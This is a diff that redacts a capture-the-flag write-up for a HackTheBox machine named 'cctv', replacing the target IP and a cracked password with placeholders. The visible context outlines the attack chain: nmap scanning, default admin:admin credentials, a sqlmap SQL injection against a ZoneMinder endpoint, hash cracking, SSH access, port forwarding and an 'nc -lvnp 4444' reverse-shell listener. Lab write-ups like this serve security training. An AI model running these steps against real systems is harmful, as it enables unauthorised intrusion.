@@ -56,7 +56,7 @@ Nmap → Default Creds (admin:admin) → SQLi CVE-2024-51428 → Hash Crack → 
 
 **Commands:**
 ```bash
-nmap -sC -sV -Pn -T4 10.129.2.132
+nmap -sC -sV -Pn -T4 <target-ip>
 ```
 
 **Findings:**
@@ -74,7 +74,7 @@ nmap -sC -sV -Pn -T4 10.129.2.132
 ### 4.2 Virtual Host Setup
 
 ```bash
-echo "10.129.2.132 cctv.htb" | sudo tee -a /etc/hosts
+echo "<target-ip> cctv.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -147,12 +147,13 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 
 **Users discovered:** `admin`, `mark`, `superadmin`
 
-Mark's bcrypt hash was extracted and cracked — password: **[redacted]**
+Mark's bcrypt hash was extracted and cracked — password: **[REDACTED]**
 
 ### 6.4 SSH Access
 
 ```bash
-ssh mark@10.129.2.132
+ssh mark@<target-ip>
+# Password: [REDACTED]
 ```
 
 **Result:** User-level access obtained as `mark`.
@@ -190,7 +191,7 @@ ssh mark@10.129.2.132
 
 **Step 1 — SSH Port Forwarding** (new terminal, not the mark SSH session):
 ```bash
-ssh -L 8765:127.0.0.1:8765 mark@10.129.2.132
+ssh -L 8765:127.0.0.1:8765 mark@<target-ip>
 ```
 
 **Step 2 — Recover HMAC algorithm from source:**
@@ -293,4 +294,7 @@ nc -lvnp 4444
 ---
 
 *End of Report*
-*Classification: Public — flags and sensitive values omitted*
+
+*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*
+
+*Full version with flags and credentials will be published after box retirement*
